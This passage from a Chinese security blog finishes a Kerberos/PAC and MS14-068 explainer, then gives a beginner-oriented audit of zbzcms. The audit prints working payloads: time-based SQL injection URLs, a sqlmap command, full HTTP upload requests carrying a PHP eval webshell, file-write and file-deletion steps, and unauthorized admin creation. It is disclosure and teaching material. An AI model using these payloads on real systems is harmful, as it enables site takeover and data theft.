title="TGS-REQ（请求）："></a><strong>TGS-REQ（请求）：</strong></h4><p>client像TGS发送client解密出的Session key然后和client info+时间戳加密的新的Session key(client info+时间戳) 以及 TGT，当TGS服务收到到client请求体KRB_TGS_REQ时，因为TGS端并没有session key，只能先利用KDC的master key去解TGT部分内容，得到session key，再去解Session key(client info+时间戳)部分，从而验证该用户是否是AS颁发给该client的。验证通过后，给client回复KRB_TGS_REP给client</p><p><strong>TGS-REP（返回）：</strong></p><p>TGS 收到请求后，检查 KDC 数据库中是否存在所请求的服务(Service ID)。如果存在，TGS 使用 KDC密钥(krbtgt 的 NTLM Hash)解密 TGT，得到 Client/TGS Session Key、timestamp、Client info；同时使用从 TGT 中解密得到的 Client/TGS Session Key去解密 Authenticator2，得到 Client info 和 timestamp。比对 Authenticator2 和TGT 的解密内容以验证通过。</p><p>•TGS 比对 Authenticator2 包含的 Client ID 和 TGT 中的 Client ID•比较时间戳（误差范围在2分钟）</p><p>•通过生命周期字段检查 TGT 是否过期</p><p>•检查 Authenticator2 已经不再 TGS 的缓存中</p><p>•若原始请求中的网络地址不为 NULL，比较 TGT 中的 IP 和请求的 IP验证成功后，随机生成 Client 所请求服务的会话密钥 Client/Server Session Key；</p><p>使用 Server 密钥（即服务器计算机的NTLM Hash）对 Client/Server Session Key、Client Info（包含 Client ID）、TimeStamp 加密得到 Client-To-Server Ticket（也称为 ST 票据）；</p><p>使用 Client/TGS Session Key 对 Client/Server Session Key 加密得到sessionkey_tgs</p><p>//ST=Server NTLM Hash(Client/Server Session Key,Client Info,TimeStamp)</p><p>//Sessionkey_tgs = Client/TGS Session Key(Client/Server Session Key)</p><p>最终将 Client-To-Server Ticket、sessionkey_tgs 返回给 Client。</p><h3 id="第三步：Client与SS交互"><a href="#第三步：Client与SS交互" class="headerlink" title="第三步：Client与SS交互"></a>第三步：Client与SS交互</h3><p><img src="/2022/03/04/Kerberos/image-20220212021542029.png" alt="image-20220212021542029"></p><p><strong>Client 向 SS(Service Server)发送服务请求</strong></p><h4 id="AP-REQ（请求）："><a href="#AP-REQ（请求）：" class="headerlink" title="AP-REQ（请求）："></a>AP-REQ（请求）：</h4><p>Client 收到 Client-To-Server Ticket、sessionkey_tgs 之后，使用Client/TGS Session Key 对 sessionkey_tgs 解密得到 Client/Server Session Key,然后使用 Client/Server Session Key 对 Client Info 和 timestamp 加密得到Authenticator3；将 Authenticator3 和 Client-To-Server Ticket 发送给所请求服务的服务器(Service Server)。</p><h4 id="AP-REP（返回）："><a href="#AP-REP（返回）：" class="headerlink" title="AP-REP（返回）："></a>AP-REP（返回）：</h4><p>Service Server 收到客户端的服务访问请求之后，利用 Server 密钥(Server 的 ntlm Hash)对 Client-To-Server Ticket 解密，提取出 Client/Server SessionKey、Client ID 等信息。Service Server 使用 Client/Server SessionKey 对 Authenticator3 解密得到 Client ID 和 TimeStamp。</p><p>Service Server 发送最后的验证消息——用 Client/Server SessionKey 加密的 Timestamp 和 Service ID 数据包给 Client。</p><p>Client 收到之后，使用缓存的 Client/Server SessionKey 解密提取 Timestamp 信息，然后确认该信息与 Client 发送的 Authenticator3 中的 Timestamp 信息是否一致。验证通过后，在定义的通讯周期内，Client 可以使用票据请求 Service。</p><h2 id="PAC"><a href="#PAC" class="headerlink" title="PAC"></a>PAC</h2><p>微软为了访问控制而引进的一个扩展PAC，以及PAC在历史上出现过的一个严重的，允许普通用户提升到域管的漏洞MS14068。</p><h3 id="PAC-介绍"><a href="#PAC-介绍" class="headerlink" title="PAC 介绍"></a>PAC 介绍</h3><p>网上很多版本的kerberos的流程是</p><ol><li><p>1.</p><p>用户向KDC发起AS_REQ,请求凭据是用户hash加密的时间戳，KDC使用用户hash进行解密，如果结果正确返回用krbtgt hash加密的TGT票据</p></li><li><p>2.</p><p>用户凭借TGT票据向KDC发起针对特定服务的TGS_REQ请求，KDC使用krbtgt hash进行解密，如果结果正确，就返回用服务hash 加密的TGS票据</p></li><li><p>3.</p><p>用户拿着TGS票据去请求服务，服务使用自己的hash解密TGS票据。如果解密正确，就允许用户访问。</p></li></ol><p>上面这个流程看起来没错，却忽略一个最重要的因素，那就是用户有没有权限访问该服务，在上面的流程里面，只要用户的hash正确，那么就可以拿到TGT，有了TGT，就可以拿到TGS，有了TGS，就可以访问服务，任何一个用户都可以访问任何服务。也就是说上面的流程解决了”Who am i?”的问题，并没有解决 “What can I do?”的问题。</p><p>为了解决上面的这个问题，微软引进了PAC，引进PAC之后的kerberos流程变成</p><p>​        用户向KDC发起AS_REQ,请求凭据是用户hash加密的时间戳，KDC使用用户hash进行解密，如果结果正确返回用krbtgt hash加密的TGT票据，<strong>TGT里面包含PAC,PAC包含用户的sid，用户所在的组</strong>。</p><p><img src="/2022/03/04/Kerberos/image-20220212235948727.png" alt="image-20220212235948727"></p><p>​        1.用户凭借TGT票据向KDC发起针对特定服务的TGS_REQ请求，KDC使用krbtgt hash进行解密，如果结果正确，就返回用服务hash 加密的TGS票据(<strong>这一步不管用户有没有访问服务的权限，只要TGT正确，就返回TGS票据，这也是kerberoating能利用的原因，任何一个用户，只要hash正确，可以请求域内任何一个服务的TGS票据，</strong></p><p>​        2.用户拿着TGS票据去请求服务，服务使用自己的hash解密TGS票据。如果解密正确，<strong>就拿着PAC去KDC那边询问用户有没有访问权限，域控解密PAC。获取用户的sid，以及所在的组，再判断用户是否有访问服务的权限，有访问权限(有些服务并没有验证PAC这一步，这也是白银票据能成功的前提，因为就算拥有用户hash，可以制作TGS，也不能制作PAC，PAC当然也验证不成功，但是有些服务不去验证PAC，这是白银票据成功的前提）</strong>就允许用户访问。</p><p>特别说明的是，PAC对于用户和服务全程都是不可见的。只有KDC能制作和查看PAC。</p><h3 id="相关安全问题"><a href="#相关安全问题" class="headerlink" title="相关安全问题"></a>相关安全问题</h3><h3 id="1-MS14068"><a href="#1-MS14068" class="headerlink" title="1. MS14068"></a>1. MS14068</h3><p>补丁编号是KB3011780，域里面最严重的漏洞之一，它允许任意用户提升到域管权限。下面简要分析下该漏洞。</p><p>该漏洞最本质的地方在于<strong>Microsoft Windows Kerberos KDC无法正确检查Kerberos票证请求随附的特权属性证书（PAC）中的有效签名</strong>，这里面的签名就是上面提到的服务检验和以及KDC校验和。导致用户可以自己构造一张PAC。 签名原本的设计是要用到HMAC系列的checksum算法，也就是必须要有key的参与，我们没有krbtgt的hash以及服务的hash，就没有办法生成有效的签名，但是问题就出在，实现的时候允许所有的checksum算法都可以，包括MD5。那我们只需要把PAC 进行md5，就生成新的校验和。这也就意味着我们可以随意更改PAC的内容，完了之后再用md5 给他生成一个服务检验和以及KDC校验和。在MS14-068修补程序之后，Microsoft添加了一个附加的验证步骤，以确保校验和类型为KRB_CHECKSUM_HMAC_MD5。</p><p>在KERB_VALIDATION_INFO结构里面，我们看到有这两个字段。</p><p><img src="/2022/03/04/Kerberos/image-20220213000156652.png" alt="image-20220213000156652"></p><p>其中GroupId是用户所在所在的组，那只要我们把重要组(比如域管组)的sid加进GroupId。那么服务拿这用户的TGS去询问域管用户是否有访问访问改服务的权限的时候，域控会解密PAC，提取里面用户的sid，以及所在的组(GroupId)，我们已经把域管加进去了，是的域控把把这个用户当做域管组里面的成员。从而达到提升为域管的效果。pykek加入的是以下组,</p><ul><li><p>域用户（513）</p></li><li><p>域管理员（512）</p></li><li><p>架构管理员（518）</p></li><li><p>企业管理员（519）</p></li><li><p>组策略创建者所有者（520）</p></li></ul><p>参考：<a href="https://daiker.gitbook.io/windows-protocol/kerberos/3">https://daiker.gitbook.io/windows-protocol/kerberos/3</a></p>]]></content>
    
    
    <categories>
      
      <category>内网</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Kerberos</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>zbzcms审计供新手学习</title>
    <link href="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p> 文章首发于奇安信攻防社区：<a href="https://forum.butian.net/share/1215">https://forum.butian.net/share/1215</a></p><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>也是源自于闲来无事 在之前逛cnvd的时候 发现的cms 然后下下来了一直没审<br>现在也是审了一下<br>cms也比较老了 有段时间没更新了</p><p>也没用很难 供新手学习(篇幅有点长)</p><p>下载地址:<a href="http://zbzcms.com/">http://zbzcms.com/</a></p><p>工具：seay phpstorm phpstudy<br>还是老方法 先用审计工具跑一波</p><h2 id="开始"><a href="#开始" class="headerlink" title="开始"></a>开始</h2><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/1.png" alt="1"></p><p>还是现看看首页长什么样子</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/2.png" alt="2"></p><p>是一个智能家居网站</p><p>然后逐步分析 工具跑步来的漏洞</p><h3 id="第一处-任意文件删除"><a href="#第一处-任意文件删除" class="headerlink" title="第一处 任意文件删除"></a>第一处 任意文件删除</h3><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/3.png" alt="3"></p><p>我们点进去查看详细</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/4.png" alt="4"></p><p>发现没有做任何的校验判断<br>$run从上面发现 也是通过GET传的</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/5.png" alt="5"></p><p>通过审计工具也可以直接看到路径</p><blockquote><p>/zbzcms.com/cms/cms/include/up.php?run=del</p></blockquote><p>那我们来构造一下<br>先在up.php同目录下创建一个txt</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/6.png" alt="6"></p><p>构造一下</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/7.png" alt="7"></p><p>执行后页面返回1<br>然后查看文件夹</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/8.png" alt="8"></p><p>成功删除<br>我们在上一级目录在创建一个2.txt</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/9.png" alt="9"></p><p>然后构造执行</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/10.png" alt="10"></p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/11.png" alt="11"></p><p>也成功删除</p><h3 id="第二处-前台sql注入"><a href="#第二处-前台sql注入" class="headerlink" title="第二处 前台sql注入"></a>第二处 前台sql注入</h3><h4 id="第一处注入点"><a href="#第一处注入点" class="headerlink" title="第一处注入点"></a>第一处注入点</h4><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/12.png" alt="12"></p><p>点进去详细查看</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/13.png" alt="13"></p><p>这里没有做过滤 我们到phpstorm里面看sql文件</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/14.png" alt="14"></p><p>在这个文件中可以看到 是有一个处理函数的 但是只针对 insert 和update</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/15.png" alt="15"></p><p>select查询函数并没有处理和其他的过滤 可直接导致注入 进行 延时注入</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/16.png" alt="16"></p><p>直接丢sqlmap跑了 </p><blockquote><p>payload：python sqlmap.py -u “<a href="http://127.0.0.1/zbzcms.com/cms/common/php/ajax.php?run=dj&amp;id=1%E2%80%9C">http://127.0.0.1/zbzcms.com/cms/common/php/ajax.php?run=dj&amp;id=1“</a> -p id</p></blockquote><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/17.png" alt="17"></p><h3 id="第二处注入点"><a href="#第二处注入点" class="headerlink" title="第二处注入点"></a>第二处注入点</h3><p>差不多和上面的一样功能点 从代码上看</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/18.png" alt="18"></p><p>也是get传参 调用select函数 没有任何过滤</p><p>路径127.0.0.1/zbzcms.com/cms/common/php/ajax.php?run=ad&amp;id=1<br>直接构造payload了：127.0.0.1/zbzcms.com/cms/common/php/ajax.php?run=ad&amp;id=1 and sleep(2)</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/19.png" alt="19"></p><p>也是可以延时盲注的</p><h3 id="第三处注入"><a href="#第三处注入" class="headerlink" title="第三处注入"></a>第三处注入</h3><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/20.png" alt="20"></p><p>跟进查看</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/21.png" alt="21"></p><p>这直接妥妥的注入了 啥防护都没有   直接接受get参数<br>直接构造</p><blockquote><p>payload：[<a href="http://127.0.0.1/zbzcms.com/cms/cms/include/make.php?php=1&amp;art=1%20and%20sleep">http://127.0.0.1/zbzcms.com/cms/cms/include/make.php?php=1&amp;art=1%20and%20sleep</a>(5](<a href="http://127.0.0.1/zbzcms.com/cms/cms/include/make.php?php=1&amp;art=1">http://127.0.0.1/zbzcms.com/cms/cms/include/make.php?php=1&amp;art=1</a> and sleep(5))</p></blockquote><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/22.png" alt="22"></p><p>就不丢sqlmap演示了</p><h3 id="第四处注入"><a href="#第四处注入" class="headerlink" title="第四处注入"></a>第四处注入</h3><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/23.png" alt="23"></p><p>我们跟进代码</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/24.png" alt="24"></p><p>这里的问题出现在tid这个参数<br>通过前面我们可以看到 如果if判断失败的话 进入else if 通过获取get传参 然后传入sql语句 这里也是没有任何防范<br>但是这里需要简单闭合一下阔号<br>我们构造</p><blockquote><p>payload：<a href="http://127.0.0.1/zbzcms.com/cms/cms/include/zidong.php?id=1&tid=3">http://127.0.0.1/zbzcms.com/cms/cms/include/zidong.php?id=1&amp;tid=3)+and+sleep(1)%23&amp;laiyuan=0&amp;sou=1&amp;wid=1</a>+and+sleep(1)%23&amp;laiyuan=0&amp;sou=1&amp;wid=1)</p></blockquote><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/25.png" alt="25"></p><p>这里tid参数的值还是有点点讲究 必须和数据库里面存的tid值其中之一是一样的</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/26.png" alt="26"></p><h3 id="第三处-前台存储xss"><a href="#第三处-前台存储xss" class="headerlink" title="第三处 前台存储xss"></a>第三处 前台存储xss</h3><p>这个是在发现注入的时候看见的</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/27.png" alt="27"></p><p>这处留言的地方<br>问题出现在neirong这个参数没有经过任何过滤就输出到了页面 并且还存入了数据库 所以导致后台查看的时候直接执行了</p><p>这出xss需要用POST的请求方法 因为从代码上可以看到 if的判断条件是$_POST 不为空<br>然后我们来到页面构造xss</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/28.png" alt="28"></p><p>执行之后 我们登入后台来查看留言</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/29.png" alt="29"></p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/30(1).png" alt="30(1)"></p><p>查看详情也是直接就弹</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/31.png" alt="31"></p><p>F12查看代码 语句也加载进来了</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/32.png" alt="32"></p><h3 id="第四处-文件上传"><a href="#第四处-文件上传" class="headerlink" title="第四处 文件上传"></a>第四处 文件上传</h3><h4 id="文件上传1"><a href="#文件上传1" class="headerlink" title="文件上传1"></a>文件上传1</h4><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/33.png" alt="33"></p><p>从路径可以发现是后台的 (但没影响 后面发现有api路径 就是任意上传)</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/34.png" alt="34"></p><p>啥过滤 判断都没有 直接传<br>因为刚开始麻烦找payload数据那些 就在后台去找了一下上传点抓包</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/35.png" alt="35"></p><p>上传的时候抓包</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/36.png" alt="36"></p><p>然后复制返回的路径 拼接到url上打开</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/37.png" alt="37"></p><p>也是成功执行<br>整体</p><blockquote><p>payload：url路径：/zbzcms.com/cms/cms/admin/ajax.php?run=youad_pic<br>参数：<br>-——-WebKitFormBoundary1yVpo1vIVcMvlXNA<br>Content-Disposition: form-data; name=”0”; filename=”yjh.php”<br>Content-Type: application/octet-stream</p></blockquote><blockquote><p>herman<br><?php [@eval](https://github.com/eval)($_POST[‘a’]); phpinfo();?><br>-——-WebKitFormBoundary1yVpo1vIVcMvlXNA—</p></blockquote><h4 id="文件上传2"><a href="#文件上传2" class="headerlink" title="文件上传2"></a>文件上传2</h4><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/38.png" alt="38"></p><p>来到phpstorm 可以发现没有任何的过滤</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/39.png" alt="39"></p><p>直接获取到路径这些就上传<br>那我们直接构造</p><blockquote><p>payload：<br>POST /zbzcms.com/cms/cms/include/up.php?run=file&amp;path=../../upload/up/&amp;filename=0 HTTP/1.1<br>Host: 192.168.1.7<br>Content-Length: 238<br>Accept: application/json, text/javascript, <em>/</em>; q=0.01<br>X-Requested-With: XMLHttpRequest<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36<br>Content-Type: multipart/form-data; boundary=——WebKitFormBoundaryqwBQidHCCHB076er<br>Origin: <a href="http://192.168.1.7/">http://192.168.1.7</a><br>Referer: <a href="http://192.168.1.7/zbzcms.com/cms/cms/admin/type.php?id=1&amp;dq=3">http://192.168.1.7/zbzcms.com/cms/cms/admin/type.php?id=1&amp;dq=3</a><br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9,is;q=0.8,zh-TW;q=0.7<br>Cookie: PHPSESSID=utnoq283ip9p4fuu5dfm56qmo5<br>Connection: close</p></blockquote><blockquote><p>-——-WebKitFormBoundaryqwBQidHCCHB076er<br>Content-Disposition: form-data; name=”0”; filename=”yjh.php”<br>Content-Type: application/octet-stream</p></blockquote><blockquote><p>herman<br><?php [@eval](https://github.com/eval)($_POST[‘a’]); phpinfo();?><br>-——-WebKitFormBoundaryqwBQidHCCHB076er—</p></blockquote><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/40.png" alt="40"></p><p>我们的访问地址：<a href="http://192.168.1.7/zbzcms.com/cms/upload/up/16422582210.php">http://192.168.1.7/zbzcms.com/cms/upload/up/16422582210.php</a> 因为有两个../嘛 所以路径变了</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/41.png" alt="41"></p><h4 id="文件上传3"><a href="#文件上传3" class="headerlink" title="文件上传3"></a>文件上传3</h4><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/42.png" alt="42"></p><p>在这个upload.php文件下<br>这里也是没有做任何的过滤<br>name为1的时候 也跳过了下面的后缀判断<br>直接构造payload：</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/43.png" alt="43"></p><p>也是成功写入</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/44.png" alt="44"></p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/45.png" alt="45"></p><h4 id="文件上传4"><a href="#文件上传4" class="headerlink" title="文件上传4"></a>文件上传4</h4><p>在另一个路径下<a href="http://192.168.1.7/zbzcms.com/cms/cms/zbzedit/php/zbz.php">http://192.168.1.7/zbzcms.com/cms/cms/zbzedit/php/zbz.php</a><br>我们来看代码</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/46.png" alt="46"></p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/47.png" alt="47"></p><p>进行了一些花里胡哨的操作 主要的问题 还是没有任何过滤和限制<br>通过path和path_res控制路径<br>data_pic_name 控制文件名0改名1不改<br>然后就是上传了<br>那就直接构造</p><blockquote><p>payload：<br>POST /zbzcms.com/cms/cms/zbzedit/php/zbz.php?run=uptxt&amp;path=../../../upload/up/&amp;path_res=../../upload/up/&amp;data_pic_name=1 HTTP/1.1<br>Host: 192.168.1.7<br>Content-Length: 238<br>Accept: application/json, text/javascript, <em>/</em>; q=0.01<br>X-Requested-With: XMLHttpRequest<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36<br>Content-Type: multipart/form-data; boundary=——WebKitFormBoundaryQy3ayf3rnYVYcEcG<br>Origin: <a href="http://192.168.1.7/">http://192.168.1.7</a><br>Referer: <a href="http://192.168.1.7/zbzcms.com/cms/cms/zbzedit/edit.html">http://192.168.1.7/zbzcms.com/cms/cms/zbzedit/edit.html</a><br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9,is;q=0.8,zh-TW;q=0.7<br>Cookie: PHPSESSID=utnoq283ip9p4fuu5dfm56qmo5<br>Connection: close</p></blockquote><blockquote><p>-——-WebKitFormBoundaryQy3ayf3rnYVYcEcG<br>Content-Disposition: form-data; name=”0”; filename=”yjh.php”<br>Content-Type: application/octet-stream</p></blockquote><blockquote><p>herman<br><?php [@eval](https://github.com/eval)($_POST[‘a’]); phpinfo();?><br>-——-WebKitFormBoundaryQy3ayf3rnYVYcEcG—</p></blockquote><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/48.png" alt="48"></p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/49.png" alt="49"></p><p>成功上传</p><h3 id="第五处-任意文件写入"><a href="#第五处-任意文件写入" class="headerlink" title="第五处 任意文件写入"></a>第五处 任意文件写入</h3><p>本来这个是在看上传的 结果看到 一个文件保存的地方 存在一个经典的文件写入函数file_put_contents<br>然后就分析了一波 发现是存在任意文件写入的</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/50.png" alt="50"></p><p>这里首先是判断的run参数 然后获取post传参的值 然后判断魔术引号那个设置是否开启 相当于放注入一些转义的功能<br>如果开启 在用stripslashes() 函数把反斜杠删去<br>然后下面就直接写入了<br>当时这个文件是在admin目录下 相当于后台的 但是通过上面的权限控制发现 可以直接绕过 这登录判断相当于就没有<br>我们来看上面判断登录的代码</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/51.png" alt="51"></p><p>通过run参数的值来判断 这不搞笑嘛 run不等于这个值不久 直接不判断了 直接执行下面的<br>好了 现在来构造payload：</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/52.png" alt="52"></p><p>执行之后</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/53.png" alt="53"></p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/54.png" alt="54"></p><p>也是成功的写入 以及访问到<br>如果get_magic_quotes_gpc()函数开启的话 写马就需要用没有引号的马子</p><h3 id="第六处-未授权任意管理员添加"><a href="#第六处-未授权任意管理员添加" class="headerlink" title="第六处 未授权任意管理员添加"></a>第六处 未授权任意管理员添加</h3><p>还是这个文件<br>有一个add 操作 没有指定表</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/55.png" alt="55"></p><p>可直接任意指定表 我们往admin表添加一个用户<br>构造payload</p><p>这里post参数就是根据数据库的字段来填的</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/56.png" alt="56"></p><p>执行之后</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/57.png" alt="57"></p><p>也是成功的添加进来<br>未授权删除 修改</p><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/58.png" alt="58"></p><p>逻辑都一样</p><h3 id="第七处-任意文件删除"><a href="#第七处-任意文件删除" class="headerlink" title="第七处 任意文件删除"></a>第七处 任意文件删除</h3><p><img src="/2022/02/10/zbzcms%E5%AE%A1%E8%AE%A1%E4%BE%9B%E6%96%B0%E6%89%8B%E5%AD%A6%E4%B9%A0/59.png" 